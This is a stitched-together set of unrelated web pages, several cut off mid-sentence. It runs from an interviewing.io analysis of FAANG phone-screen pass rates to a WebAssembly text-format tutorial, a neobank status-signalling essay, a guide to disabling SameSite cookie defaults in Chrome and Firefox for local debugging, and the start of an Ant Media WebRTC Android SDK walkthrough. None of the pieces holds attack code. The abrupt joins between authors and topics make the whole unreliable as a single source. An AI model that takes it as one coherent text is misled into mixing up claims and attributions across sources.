<p>While it would be simple to conclude there exists no relationship between technical ability and passing a phone interview, it seems more likely that we were experiencing selection bias. After all, 60-80% of people progressing past Google/Amazon/Facebook phone screens seems a bit high relative to what one might expect.</p>



<p>Compared to the population of all people on interviewing.io, survey respondents with high average technical scores between 3 and 4 were over-represented relative to those who scored between 1.5 and 2.75<sup><a id="footnote1" href="#footnote1-details">[1]</a></sup>. Maybe non-respondents with lower scores and who failed Google/Facebook/Amazon phone interviews happened to be less likely to respond to our survey.</p>



<p>So that’s pretty limiting. But let’s keep in mind that all models are wrong, yet some are useful, so perhaps it’s still possible to learn other stuff from the data. If the survey respondents’ technical abilities weren’t obviously associated with interview success, what about other factors?</p>



<span>More experience with real technical interviews is associated with future interview success</span>



<p>When digging further, the factor that stood out most was how many real technical interviews the candidate had done in the past. Across all three companies, people who had completed 5 or more real technical interviews tended to have higher rates of passing a phone interview than those who had less real interview experience.</p>



<figure><img src="https://lh3.googleusercontent.com/y2MlAXnOdEb_5evno08aQnxD9i7mHv2-e2jjwg0PjdSE4TC-EuAgcy17b6_gPYjxHgz0aimKPq-TNcC6gdY6mgO_BCTC9dHS7O5BvQCrFlE-WhAVgeQumMaJnEV15xNNq9yCsY0" alt=""></figure>



<figure><img src="https://lh5.googleusercontent.com/dypDixrmeIx3LUZqjB-GuD0L91iSxOJgtEdp2ENhMZ53_UiHRKSZZ9d_vEX4KQC_4JEu7dxqT_gRMDM_rP5hcRj-a08GMaEqvXhWNGCthd7Jvf9159kNQIEt7vLFaWXsRqw-9ww" alt=""></figure>



<figure><img src="https://lh4.googleusercontent.com/95fYSFE27TziZN1JrBDinxQMPiwt8Ny58_IuHvL52e00Z7kRF-lHmZSXdpr1ng0nMCQ3Zk-qZNFP8bu9CDqjTBw3IADshelLhdqPIiy2ZvpJEZC-o1kkLHKfzH9BEiQtOkDoyEk" alt=""></figure>



<p>It’s possible this large effect could have been confounded by other factors, so I iterated on the model to account for these factors, to see whether the effect of prior interview experience on interview success would continue to shine through.</p>



<p>Here were the factors considered:</p>



<ul><li>Average technical rating</li><li>Average problem solving rating</li><li>Average communication rating</li><li>Number of mock interviews completed on interviewing.io</li><li>Experience level</li><li>Gender</li><li>Did the person have a computer science degree?</li></ul>



<p>For 171 respondents who went through the Amazon hiring process, a statistically significant association continued to exist between prior technical interview experience and succeeding in a phone interview. Below were the predicted probabilities of passing a phone interview for a typical respondent in this survey (males with a computer science degree and 4+ years of experience, with average technical, communication, and problem solving ability), conditional on their prior technical interview experience.</p>



<figure><table><tbody><tr><td><strong>Prior Experience</strong></td><td><strong>Predicted Probability of Passing Amazon Phone Screen</strong></td></tr><tr><td>1-4 technical interviews</td><td>65%</td></tr><tr><td>5+ technical interviews</td><td>81%</td></tr></tbody></table></figure>



<p>For Facebook we observed a similar effect:</p>



<figure><table><tbody><tr><td><strong>Prior Experience</strong></td><td><strong>Predicted Probability of Passing Facebook Phone Screen</strong></td></tr><tr><td>1-4 technical interviews</td><td>40%</td></tr><tr><td>5+ technical interviews</td><td>71%</td></tr></tbody></table></figure>



<p>Finally, for Google applicants we observed that the number of interviewing.io mock interviews completed had the clearest association with interview success, not prior technical interview experience. While mock interviews aren’t exactly the same as real-world technical interviews, they are conducted by the same kinds of people asking similar questions and using similar assessment criteria. Because of this, it seems possible that the effects of mock interviews on interview success could be similar to the effect of real technical interview experience.</p>



<p>Below was the estimated chance of passing the Google phone interview for the typical survey respondent, conditional on the number of interviewing.io practice interviews attended.</p>



<figure><table><tbody><tr><td><strong>Mock interviews on interviewing.io</strong></td><td><strong>Predicted Probability of Passing Google Phone Screen</strong></td></tr><tr><td>2</td><td>69%</td></tr><tr><td>3</td><td>76%</td></tr></tbody></table></figure>



<p>Looking at the other variables we included in the model, we observed no other statistically significant relationships with success in phone interviews. It’s possible those relationships actually exist, but based on this sample, we did not observe enough evidence to reject the null hypothesis that no relationship exists.</p>



<p>So even after accounting for other factors, more technical interview experience was still associated with greater success in phone interviews.</p>



<p>We also wondered whether similar effects might exist when you get further down the hiring funnel. For example, could prior technical interview experience also improve your chances of receiving an offer after an onsite? We performed a similar analysis to predict the chance of receiving an offer conditional upon attending an onsite interview, but we found no noticeable relationships between the predictors listed above and the probability of receiving an offer. Sample sizes are naturally smaller when looking this far down the funnel, and perhaps the differences between candidates are smaller, which could be harder to detect.</p>



<p>Based on an analysis of this particular group of people, it seems we have a pretty clear answer to the original question of “What metric should be used to know you’re prepared to succeed in a FAANG interview?” </p>



<p>The answer is to <strong>experience five or more real technical interviews</strong>. Simple, right?</p>



<span>Why more experience with technical interviews helps you succeed in future technical interviews</span>



<p>I don’t know about you, but I find that answer unsatisfying. That conclusion seems <em>really</em> questionable and self-serving, especially when the recommendation comes from a company that offers mock technical interviews as a product.</p>



<p>I don’t blame you, and quite frankly, this result wasn’t what we expected either. The metric of technical interviewing experience is probably just a proxy for some other phenomenon that does correlate with interview success in some explainable way. After all, it’s unlikely that just showing up to five interviews will magically bestow upon you new talents.</p>



<p>So what is it about having technical interview experience that might be associated with success in future technical interviews? To dig even deeper, we followed up with survey respondents who successfully received an offer with Google, Facebook, or Amazon, and asked what factors they felt contributed to their success.</p>



<p>As you’d expect, nearly all respondents said practicing technical problems was the foundation for their success. So yes, technical competency matters, and no, past interview experience doesn’t appear to be a substitute for it.</p>



<p>Beyond technical ability, respondents shared anecdotes that hint at why such a relationship might exist, as well as some possible underlying factors that could explain what technical interview experience might proxy for.</p>



<span>Direct feedback from other people helps you improve quicker</span>



<p>It’s one thing to get a question wrong in a practice environment, and it’s another thing to get a question wrong when you have an interviewer looking over your shoulder. …</p></section></div>

<a href="https://ph1lter.bitbucket.io/index.html">(home)</a> <span>2020-12-03</span>
<p>The combination of forth semantics and s-expr syntax makes the WebAsm text format (WAT/.wat) probably the most
powerful programming language extant today. Soon I expect it to obviate <em>all other languages</em>. <span>joke</span>
</p>
<p>There is a common myth floating around that webasm is just a binary format for a javascript AST (abstract syntax
tree). That is <em>really</em> selling webasm short.
</p>
<h2> forth</h2>
<p>webasm is like forth in so far as it is a stack machine. There are no registers in the webasm virtual machine.
</p>
<p>Unlike forth, webasm functions have explicit parameters, local variables and only return a single value (currently).
webasm also lacks forth's rich set of words for stack manipulation <code>[dup swap roll ...]</code>
</p>
<h2> lisp</h2>
<p>webasm's text format uses lisp/s-expr syntax. The language syntax also has many lisp style influences. Impressive!
<span>Finally, someone in a position of power has realized that we should be using s-expr's for everything and discarding xml and json.</span>
</p>
<h2> static typing</h2>
<p>All webasm globals, locals, parameters and functions are strongly statically typed. Only a few simple types (integer and float) and
a reference type are allowed. <code>[types::=i32,i64,f32,f64]</code>.
</p>
<p>Note the absence of strings or even arrays. No unsigned types either, although there are some instructions which can
be marked signed/unsigned <code>[right-shift, greater-equal ...]</code>.
</p>
<h2> memory</h2>
<p>wasm memory layout is like what you find on simple 80's computer or a <em>not-too-modern</em> microcontroller. The memory starts at zero
and proceeds to a specified max value (the max value is dynamically growable, cf. C's brk()).
</p>
<p>Not even malloc() is provided.
</p>
<p>Memory pointers are just i32/i64 integer offsets in the memory array (exactly the same as <em>real</em> pointers ...).
</p>
<h2> assembler</h2>
<p>wasm instructions are very much on the assembler end of the spectrum, with <code>i32.add, f32.neg</code> and the like.
There are some slightly higher-level (more controlled) control forms like (block) and (loop). Arbitrary jumps
are not possible [security feature]. Indeed code and data are <strong>not</strong> in the same address space, and code space is
completely opaque to the wasm programmer.
</p>
<h2> overall structure</h2>
<p>The top-level form is a <code>(module ...</code>) which can contain globals and functions.
<span>There are also import, export, memory size specs and even type definitions.</span>
</p>
<pre>(module
  (func $malloc (param $len i32) (result i32)
    ;; ... body returning an i32
    ))
</pre>
<p>Canonically instructions are laid out flat but the text format also allows for a much nicer nested s-expr syntax.
</p>
<p>flat syntax (making the stack machine more obvious):
</p>
<pre>global.get $dot
local.get $len
i32.add
global.set $dot
</pre>
<p>s-expression alternative (same code)
</p>
<pre>(global.set $dot (i32.add (global.get $dot) (local.get $len)))
</pre>
<p>Parameters, locals and even functions can all be accessed by index but they can be given optional labels too.
This and the s-expr option makes it a breeze to code directly in the language itself. <span>joke</span>
</p>
<h2> runtime environment</h2>
<p>The entire wasm code is called from javascript, which has an api designed to load and import functions from a wasm file
(see below for example)
</p>
<h2> import/export</h2>
<p>webasm functions can be exported to javascript like this:
<span>note how the wasm return value is implicitly whatever is on the stack at exit; wat compilers check stack arity and type.</span>
</p>
<p><span>[full code example at the end]</span>
</p>
<pre>(func (export "addNumbers") (param $a i32) (param $b i32) (result i32)
  (i32.add (local.get $a) (local.get $b)))
</pre>
<pre>// called from javascript like this (after some incantations)
var someNumber = 17;
const sum = wasm.instance.exports.addNumbers(12, someNumber);
</pre>
<p>Javscript can also export functions into wasm-space, using a 2-level object passed into the WebAssembly incantation.
</p>
<pre>// export a console.log(i32) function
var importObject = {
  console: { log: function(num) { console.log(num + " 0x" + (num&gt;&gt;&gt;0).toString(16)); } },
  };
WebAssembly.instantiateStreaming(fetch("malloc.wasm"), importObject)
&nbsp; .then(function(wasm){
      .... access wasm functions in here
      });
</pre>
<p>The javascript exports must be explicitly imported by the wasm module and given a local function signature (and name).
<span>unlike the js counterpart, the wasm function is strongly, statically typed, taking a single i32 parameter, only</span>
</p>
<pre>(import "console" "log" (func $js_log (param $i i32)))
...
(call $js_log (i32.const 15)) ;; example of calling out to javascript
</pre>
<h2> externref - the part of the spec we wish we had</h2>
<p>It would be nice to have another wasm type, an opaque, read-only, javascript reference object which we could receive from javascript,
store and later pass back to javascript in our callouts/callbacks.
</p>
<p>You will miss this feature almost as soon as you write your first substantial <code>wat</code> program.
</p>
<p>Alas the <code>externref</code> spec is not part of the original webasm spec and is a newer addition. I am not sure how widely adopted it is.
</p>
<h2> a more substantial example</h2>
<p>(the full html/wat code is linked below, also as a live example)
</p>
<p>The WAT source code of for the (cheap) malloc() example function and another (even cheaper) dump_range() function which calls back
to javascript to write bytes into the debug console.
</p>
<pre>(module
  (memory (import "js" "mem") 10)
  (import "console" "log" (func $js_log (param $i i32)))
  (global $memend i32  (i32.const 4096))
  (global $sbrk (mut i32)  (i32.const 0))
  ;; ----- allocate some memory in wasm-space
  (func (export "malloc") (param $len i32) (result i32)
    (local $newbrk i32)
    (local $mem i32)
    (local.set $newbrk (i32.add (global.get $sbrk) (local.get $len)))
    (if (i32.ge_u (local.get $newbrk) (global.get $memend))
      (return (i32.const 0)))
    (local.set $mem (global.get $sbrk))
    (global.set $sbrk (local.get $newbrk))
    (local.get $mem))
  ;; ----- write bytes in wasm-space memory using js callback
  (func (export "dump_range") (param $start i32) (param $len i32)
    (local $i i32)
    (local $end i32)
    (local.set $end (i32.add (local.get $start) (local.get $len)))
    (local.set $i (local.get $start))
    (block $break2 (loop $head1
      (br_if $break2 (i32.eq (local.get $i)  (local.get $end)))
      (call $js_log (i32.load8_u (local.get $i)))
      (local.set $i (i32.add  (i32.const 1) (local.get $i)))
      (br $head1))))
  )

<h3>How Neobanks Should Monetize Status Signaling</h3>



<p><span>01</span> Intro</p>



<p>If you’ve been following this blog for a while, you probably know by now that one of my favorite topics to think and write about is “status signaling”.</p>



<p>Signaling explains most of our everyday actions: what clothes we wear, which universities we pick and which religion we subscribe to. Everything has a hidden signaling component with which we communicate our desired tribal affiliation.</p>



<p>In <a href="http://julian.digital/2020/03/28/signaling-as-a-service/">Signaling-as-a-Service</a>, I described the implications signaling has on the monetization of software businesses. For many traditional industries, monetizing the display of status is not a new concept. A Rolex watch, for example, is not better at telling the time than a cheap Casio watch. But a Rolex reveals something about its owners’ wealth and, thus, their status in society. It’s that status message that explains the difference in price.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/equaltime.png"></p><p>Similarly, driving a Prius says something about your views on climate change. A <em>Make America Great Again</em> cap reveals something about your political affiliations. And Nike athletic wear signals a healthy, pro-active lifestyle.</p>



<p>Software is at a crucial disadvantage compared to these physical products because of its intangibility. A fitness app also signals a healthy, pro-active lifestyle, but no one can see it because it only lives on your phone. Everyone can see your Nike gear whenever you wear it in public. Software can’t offer the same benefit. It doesn’t have a signaling distribution channel.</p>



<p>This is why there is no software equivalent of a Rolex watch or a Louis Vuitton handbag. People aren’t willing to spend money on things other people can’t see they spent money on.</p>



<p>But it doesn’t have to be that way. As software is eating the world, the lines between physical and digital products are becoming increasingly blurry. As I have pointed out in my original essay, one way for software companies to solve the signaling distribution problem is to add a physical element to their software product.</p>



<p>In this post I want to explore this idea a little bit further. Specifically, we’ll look at neobanks – and their opportunity to monetize credit card signaling.</p>



<p><span>02</span> Neobanks</p>



<p>In the last couple of years we have witnessed the birth and rise of a new startup vertical: neobanks.</p>



<p>Neobanks differ from traditional banks in two ways:</p>



<p>1) Rather than relying on a physical branch network, the entire banking experience is managed via an app</p>



<p>2) Instead of the <a href="https://www.youtube.com/watch?v=C-q4bEULG64">“how do you do, fellow kids”</a>-cringiness that ad campaigns of traditional banks usually invoke when they try to appeal to a younger audience, neobanks are actually perceived as cool. In fact, many of them feel more like lifestyle brands than banks or tech companies.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/12/1_26qGBSGmB3yaPD7nZJrFIg.gif">



<img src="https://julian.digital/wp-content/uploads/2020/12/lifestylebrand-1.png"></p><p>Interestingly though, neobanks still use one very traditional banking element: physical cards.</p>



<p>At first glance, this might seem counterintuitive. If you are building a mobile-first bank, why not offer virtual cards and let users pay with their phone? Why go through the hassle of producing and shipping physical cards?</p>



<p>The answer is – you guessed it – signaling.</p>



<p>Think about it: Paying for things (offline) is a social activity. It’s an interaction between at least you and a cashier or waiter. But ideally, in a dinner scenario for example, you are surrounded by other people you want to impress: a date, a group of friends, or work colleagues.</p>



<p>This makes the moment you take out your card to pay the bill a great opportunity to make a statement and build social capital.</p>



<p>If you look at neobanks out there today, it’s pretty obvious that signaling is in fact one of the main benefits they offer – and almost the only thing they monetize <span>(apart from interchange, of course)</span>:</p>



<ul><li>The premium subscriptions neobanks offer usually don’t win on features but solely on nicer looking cards. The <a href="https://n26.com/metal">N26</a> or <a href="https://revolut.com/metal">Revolut</a> Metal plans, for example, don’t offer any additional features that <em>really</em> justify the ~€15 / month price tag. They do include a nice looking metal card though – that’s what people pay for.</li><li>Relatedly, it seems like most of the innovation in the industry is happening in card design. The actual banking products are more or less interchangeable, what differs is whether the card comes in <a href="https://www.apple.com/apple-card/">titanium</a>, <a href="https://www.treecard.org/">wood</a>, or <a href="https://twitter.com/cashapp/status/1290694734529400832">glow-in-the-dark yellow</a>.</li><li>You may have noticed that the credit card number has moved from the front to the back of the card. This makes it easier for users to share photos of their cards on social media as an additional signaling distribution channel.</li></ul>



<p><img src="https://julian.digital/wp-content/uploads/2020/11/nocardnumber-1.png"></p><p>Neobanks are popping up like mushrooms after the rain at the moment and it’s unlikely that this trend will end any time soon. Thanks to banking-as-a-service providers, we’ll likely see a lot of non-banking-companies add banking functionalities and cards to their product offering.</p>



<p>There’s an old Twitter joke that every app evolves until it eventually becomes a chat app. The 2020 version of that joke is that every app evolves until it eventually becomes a bank.</p>



<p>When <a href="https://twitter.com/lehrjulian/status/1295024066869567488">I did some research on credit card designs</a> recently, I was surprised by the sheer amount of different neobanks already in existance. And yet, even though almost all of them offer well-designed cards, it’s shocking how similar they all are. It seems like all of them are focusing on the same target audience instead of differentiating their signaling messages.</p>



<p>Let me explain.</p>



<p><span>03</span> In-Groups, Out-Groups and Artificial Scarcity</p>



<p>In every signaling scenario there are two possible target audiences: An in-group and an out-group.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/groups.png"></p><p>The in-group is the tribe you want to join and signal your affiliation to. The out-group is everyone else – people you want to distance yourself from.</p>



<p><a href="https://www.fastcompany.com/90391587/why-we-dont-want-you-and-your-android-green-bubbles-in-our-imessage-chat">iMessage is a great illustration of this</a>: the chat bubble colors clearly indicate who belongs to the in-group (blue = iOS) and who is part of the out-group (green = Android). </p>



<p>It’s important to note that signaling in iMessage is limited to the in-group since these color codes are only visible for iOS users – Android users can’t see who in the group is using which operating system. </p>



<p>Signaling, however, grows stronger the larger the out-group is – as long as the out-group knows about the in-group. This is why luxury car manufacturers deliberately extend their advertising campaigns to people who will never be able to afford their cars: they are increasing the size of the out-group by educating people about the in-group.</p>



<p>At the same time, brands need to control the size of the in-group. The more exclusive the in-group, the higher the signaling strength and, thus, the monetization potential of a customer. </p>



<p>The easiest control mechanism for the size of the in-group is price. If you set the price high enough, few people will be able to afford the product. Ironically, this, in turn, justifies the high price.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/priceloop.png"></p><p>Alternatively, companies create artificial scarcity by setting a hard number on supply. Limited supply creates FOMO and hype which increases the size of the out-group and results in higher social status for members of the in-group. Artificial scarcity explains the price of Bitcoin, Pokémon trading cards and why people spend hours queuing in front of Supreme shops.</p>



<p>The problem with keeping the in-group small is that it also limits the number of potential customers and, thus, overall revenue potential. Companies need to walk a fine line between maximizing the number of customers while simultaneously maximizing the number of people they can (afford to) exclude.</p>



<p><span>04</span> What Neobanks Should Build</p>



<p>The problem with neobanks today is that they all focus on the same in-group. Here are the premium cards of some of the largest European challenger banks – notice any difference?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/metalcards.png"></p><p>It seems like everyone is trying to become the Apple of Banking – including <a href="https://www.apple.com/apple-card/">Apple itself</a>. The signaling messages are all about displaying economic power.</p>



<p>But we are slowly seeing new banking apps that are focusing on different audiences. For example, there are now a <a href="https://www.tomorrow.one/">handful of</a> <a href="https://blog.gohenry.com/uk/gohenry-news/meet-our-new-biodegradable-eco-card/">“green”</a> <a href="https://www.treecard.org/">neobanks</a> that help users signal environmental altruism. </p>



<p>Or how about <a href="https://www.razer.com/razer-card">this Razer Card</a> targeted at the gamer community?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/12/environment.png"></p><p>The question for these companies and their investors is whether the in-group is big enough to justify building an entire bank around it. Making the unit economics of a bank work requires a certain amount of users, but as we discussed earlier, the signaling strength decreases as the size of in-group increases.</p>



<p>So how do you solve this problem?<br>By introducing multiple in-groups.</p>



<p>See, the current model looks like this:</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/neogroup01.png"></p><p>(In fact, given how undifferentiated most of the offerings and cards are, there are actually multiple neobanks within the same small in-group bubble.)</p>



<p>But what if one bank would target multiple, different in-groups?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/neogroup02.png"></p><p>For example, what if N26 had dedicated cards for soccer fans, hip-hop enthusiasts and gamers? Instead of focusing on just one signaling audience, their total addressable market would massively increase. </p>



<p>The way they would target these audiences is via brand collaborations. N26 does not have the necessary reputation in any of the above-mentioned areas to build credible signaling messages. It would not be able to build attractive in-groups on its own – but other brands could lend N26 their social capital. </p>



<p>Apple has long worked with <a href="https://www.apple.com/lae/product-red/">RED</a>, IKEA recently <a href="https://www.highsnobiety.com/p/virgil-abloh-ikea-collaboration-best-look/">teamed up with Virgil Abloh</a>, and <a href="https://www.headspace.com/partners/nike-partnerships">Nike partners with Headspace</a>. Why wouldn’t this concept work for neobanks?</p>



<p>What would <strong>N26 x Manchester United</strong> look like? <br>Or <strong>Chime x Supreme</strong>? <br>Or <strong>Revolut x 100 Thieves</strong>?</p>



<p>Because of a bigger target audience overall, individual in-groups could be kept smaller. Cards could be <a href="https://thegeneralist.substack.com/p/scarcity-as-an-api">released as limited edition drops</a> transforming them into collectibles, which would justify a higher price tag per card.</p>



<p>It’s worth noting that different signaling audiences are not mutually exclusive. We don’t just subscribe to a single in-group – our <a href="http://julian.digital/2020/09/25/is-this-real-life/">identities are prismatic</a>. This means that some users might …</p></div></div>

    <p>Browser vendors like Mozilla or Google have introduced new default values for
the <code>sameSite</code> attribute when setting browser cookies [1]. While this change is
great for preventing third-party tracking through cookies, it can make a
developer’s life quite frustrating when wanting to debug a local front end
pointing to a remote server.</p>
<p>Especially, when Chrome and Firefox give confusing or no warnings at all. Here’s
an example of Chrome complaining:</p>
<p><img src="https://timdaub.github.io/assets/images/chrome_samesite.png" alt=""></p>
<p>In Firefox, there’ll likely be a small warning in the console:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>Some cookies are misusing the “SameSite“ attribute, so it won’t work as expected </span><br></pre></td></tr></tbody></table></figure>
<h2 id="The-Problem">The Problem</h2>
<p>For me the problem was the following: I had a staging server running online. It
contained sample data that I preferred using to test my front end over a local
backend server.</p>
<p>There’s a similar problem that developers run into with this type of setup:
CORS. I usually encounter it either when:</p>
<ul>
<li>I host front end and back end on different domains</li>
<li>I spin up a local front end development server and connect it to a backend
running online.</li>
</ul>
<p>That problem, I tend to prefer solving it by downloading a browser plugin that
temporarily disabled CORS. The recent <code>sameSite</code> cookie attribute change,
however, is different in that it’s recent. I only found limited information
about bypassing it online. There are no browser plugins yet either. Still, it
can be easily fixed by modifying some settings in your browser.</p>
<h2 id="Disabling-sameSite-policy-in-Google-Chrome">Disabling sameSite policy in Google Chrome</h2>
<ol>
<li>Navigate to <code>chrome://flags/#same-site-by-default-cookies</code>.</li>
<li>Set <em>“SameSite by default cookies”</em>, <em>“Enable removing SameSite=None
cookies”</em>, <em>“Cookies without SameSite must be secure”</em> to <code>Disabled</code>.</li>
<li><strong>Make sure to restart Chrome.</strong></li>
</ol>
<p>When trying your <code>Set-Cookie</code> request, the yellow overlay in the
request inspection tab should now be gone and your cookies should show up in
the “Application” tab.</p>
<h2 id="Disabling-sameSite-policy-in-Mozilla-Firefox-Developer-Edition">Disabling sameSite policy in Mozilla Firefox Developer Edition</h2>
<p>Go to <code>about:config</code> and make sure you have the following settings
[2]:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span>network.cookie.sameSite.laxByDefault: false</span><br><span>network.cookie.sameSite.noneRequiresSecure: false</span><br></pre></td></tr></tbody></table></figure>
<h2 id="Conclusion">Conclusion</h2>
<p>Issues with blocked <code>SameSite</code> cookies in local development environments can be
fixed by temporarily disabling sameSite policies in Firefox and Chrome. To

<p>Ant Media Server has native mobile SDKs (IOS and Android) for WebRTC. You can use <strong>WebRTC</strong> facilities in <strong>Android Platform</strong> with the help of Ant Media Server’s <strong>Native&nbsp;Android WebRTC SDK</strong>. In this blog post, features of Android SDK will be presented with a sample Android project which comes bundled with the SDK.</p>
<p>This SDK has the following main features:</p>
<ul>
<li>Provides peer to peer WebRTC communication between Android devices and browsers by using <a href="https://antmedia.io/">Ant Media server</a> as a signalling server.</li>
<li>Could publish WebRTC stream which could be played by other Android devices and browsers (mobile or desktop).</li>
<li>Could play WebRTC stream which is published by other&nbsp;Android devices and browsers (mobile or desktop).</li>
<li>Could join conference room that is created in Ant Media Server.</li>
</ul>

<h2>Prerequisites for WebRTC Android SDK</h2>
<p><span>WebRTC iOS and Android SDK’s are free to download. You can access them through&nbsp;</span><a href="https://antmedia.io/free-webrtc-android-ios-sdk/" rel="nofollow">this link on antmedia.io</a><span>. If you’re an enterprise user, it will be also available for you to download in your subscription page. Anyway, after you download the SDK, you can just unzip the file.</span>You could also obtain a trial version of Ant Media Server Enterprise Edition from <a href="https://antmedia.io/free-trial/">here</a>.</p>
<h3>Run the Sample WebRTC Android App</h3>
<p>After downloading the SDK, open and run the sample project in Android Studio.</p>
<p><img src="https://github.com/ant-media/Ant-Media-Server/wiki/images/android-open-project-path.png" width="766" height="488" alt="Open WebRTC SDK" title="How to Use WebRTC SDK in Native Android App? 2"></p>
<p><span>Select your project’s&nbsp;</span><code>build.gradle</code><span>&nbsp;file path and Click to the OK button.</span></p>
<p><img src="https://github.com/ant-media/Ant-Media-Server/wiki/images/android-project-path-apply.png" width="1434" height="898" alt="How to Use WebRTC SDK in Native Android App? 2" title="How to Use WebRTC SDK in Native Android App? 3"></p>
<p><span>PS: You need to set&nbsp;</span><code>SERVER_ADDRESS</code><span>&nbsp;parameter in MainActivity.java:</span></p>
<p><img src="https://github.com/ant-media/Ant-Media-Server/wiki/images/server_address.png" width="3218" height="1796" alt="How to Use WebRTC SDK in Native Android App? 3" title="How to Use WebRTC SDK in Native Android App? 4"></p>
<h3>Publish Stream from your Android</h3>
<ul>
<li>In<span>&nbsp;</span><code>MainActivity.java</code>, you need to set<span>&nbsp;</span><code>webRTCMode</code><span>&nbsp;</span>parameter to<span>&nbsp;</span><code>IWebRTCClient.MODE-PUBLISH</code></li>
<li>In<span>&nbsp;</span><code>MainActivity.java</code>, set the stream id to anything else then<span>&nbsp;</span><code>stream1</code><span>&nbsp;</span>i.e<span>&nbsp;</span><code>streamTest1</code>:</li>
</ul>
<p><img src="https://github.com/ant-media/Ant-Media-Server/wiki/images/streamId.png" width="720" alt="How to Use WebRTC SDK in Native Android App? 4" title="How to Use WebRTC SDK in Native Android App? 5"></p>
<ul>
<li>Tap<span>&nbsp;</span><code>Start Publishing</code><span>&nbsp;</span>button on the main screen. After the clicking<span>&nbsp;</span><code>Start Publishing</code>, stream will be published on Ant Media Server.<img src="https://camo.githubusercontent.com/6d9d0bcd74943dd614017572abe4adc3473a7f662120b65eacd0a6c953374116/68747470733a2f2f616e746d656469612e696f2f77702d636f6e74656e742f75706c6f6164732f323032302f30382f616e64726f69642d7765627274632d73646b2d7075626c6973682d73637265656e2e6a7067" width="360" data-canonical-src="//i0.wp.com/antmedia.io/wp-content/uploads/2020/08/android-webrtc-sdk-publish-screen.jpg" alt="How to Use WebRTC SDK in Native Android App? 5" title="How to Use WebRTC SDK in Native Android App? 6"></li>
<li>Then it will start Publishing to your Ant Media Server. You can go to the web panel of Ant Media Server(http://server_ip:5080) and watch the stream there. You can also quickly play the stream via<span>&nbsp;</span><code>https://your_domain:5443/WebRTCAppEE/player.html</code></li>
</ul>
<h3>Play Stream from your Android</h3>
<ul>
<li>Firstly, you need to set<span>&nbsp;</span><code>webRTCMode</code><span>&nbsp;</span>parameter to<span>&nbsp;</span><code>IWebRTCClient.MODE_PLAY</code><span>&nbsp;</span>in<span>&nbsp;</span><code>MainActivity.java</code>.</li>
<li>Playing stream on your Android is almost the same as Publishing. Before playing, make sure that there is a stream that is already publishing to the server with same stream id in your<span>&nbsp;</span><code>streamId</code><span>&nbsp;</span>parameter (You can quickly publish to the Ant Media Server via<span>&nbsp;</span><code>https://your_domain:5443/WebRTCAppEE</code>). For our sample, stream id is still “streamTest1” in the image below. Then you just need to tap<span>&nbsp;</span><code>Start Playing</code><span>&nbsp;</span>button.<img src="https://camo.githubusercontent.com/3139af3138ee8517e1a38f62b965d8a5241fe55124541cb3fc9c83b0d9dd1b07/68747470733a2f2f616e746d656469612e696f2f77702d636f6e74656e742f75706c6f6164732f323032302f30382f616e64726f69642d7765627274632d73646b2d706c61792d73637265656e2e6a7067" width="360" data-canonical-src="//i0.wp.com/antmedia.io/wp-content/uploads/2020/08/android-webrtc-sdk-play-screen.jpg" alt="How to Use WebRTC SDK in Native Android App? 6" title="How to Use WebRTC SDK in Native Android App? 7"></li>
</ul>
<h3>P2P Communication with your Android</h3>
<p>WebRTC Android SDK also supports P2P communication. As you guess, just set<span>&nbsp;</span><code>webRTCMode</code><span>&nbsp;</span>parameter to<span>&nbsp;</span><code>IWebRTCClient.MODE_JOIN</code>.</p>
<p><img src="https://camo.githubusercontent.com/9c97ac306779d97ae8ebab468b870edead02eb9ebe30b9a9c30c37b47819ec4d/68747470733a2f2f616e746d656469612e696f2f77702d636f6e74656e742f75706c6f6164732f323032302f30382f616e64726f69642d7765627274632d73646b2d706565722d73637265656e2e6a7067" width="360" data-canonical-src="//i0.wp.com/antmedia.io/wp-content/uploads/2020/08/android-webrtc-sdk-peer-screen.jpg" alt="How to Use WebRTC SDK in Native Android App? 7" title="How to Use WebRTC SDK in Native Android App? 8"><span></span></p>
<p>When there is another peer is connected to the same stream id via Android, iOS or Web, then P2P communication will be established and you can talk to each other. You can quickly connect to the same stream id via<span>&nbsp;</span><code>https://your_domain:5443/WebRTCAppEE/peer.html</code></p>
<h3>Join Conference Room with your Android</h3>
<p>WebRTC Android SDK also supports Conference Room feature. You just need to change the launcher activity to ConferenceActivity.java activity:</p>
<p><img src="https://github.com/ant-media/Ant-Media-Server/wiki/images/android_conference.png" width="720" alt="How to Use WebRTC SDK in Native Android App? 8" title="How to Use WebRTC SDK in Native Android App? 9"><span></span></p>
<p>When there are other streams are connected to the same stream id via Android, iOS or Web, then Conference Room will be established and you can talk to each other. You can quickly connect to the same stream id via<span>&nbsp;</span><code>https://your_domain:5443/WebRTCAppEE/conference.html</code></p>
<p><img src="https://camo.githubusercontent.com/b5574b813482b403d21aa637190337bc227b2e436322f3f0937a87721f69252e/68747470733a2f2f616e746d656469612e696f2f77702d636f6e74656e742f75706c6f6164732f323032302f30382f616e64726f69642d7765627274632d73646b2d636f6e666572656e63652d726f6f6d2e6a706567" width="360" data-canonical-src="//i0.wp.com/antmedia.io/wp-content/uploads/2020/08/android-webrtc-sdk-conference-room.jpeg" alt="How to Use WebRTC SDK in Native Android App? 9" title="How to Use WebRTC SDK in Native Android App? 10"><span></span></p>
<h2>Develop a WebRTC Android App</h2>
<p>We highly recommend using the sample project to get started your application. Nevertheless, it’s good to know the dependencies and how it works. So that we’re going to tell how to create a WebRTC Android app from Scratch. Let’s get started.</p>
<h3>Creating Android Project</h3>
<h5>Open Android Studio and Create a New Android Project</h5>
<p>Just Click<span>&nbsp;</span><strong><code>File &gt; New &gt; New Project</code></strong><span>&nbsp;</span>. Choose Empty Activity in the next window:</p>
<p><img src="https://github.com/ant-media/Ant-Media-Server/wiki/images/setup_new_1.png" width="720" alt="How to Use WebRTC SDK in Native Android App? 10" title="How to Use WebRTC SDK in Native Android App? 11"><span></span></p>
<p>Click Next button and a window should open as shown below for the project details. Fill the form:</p>
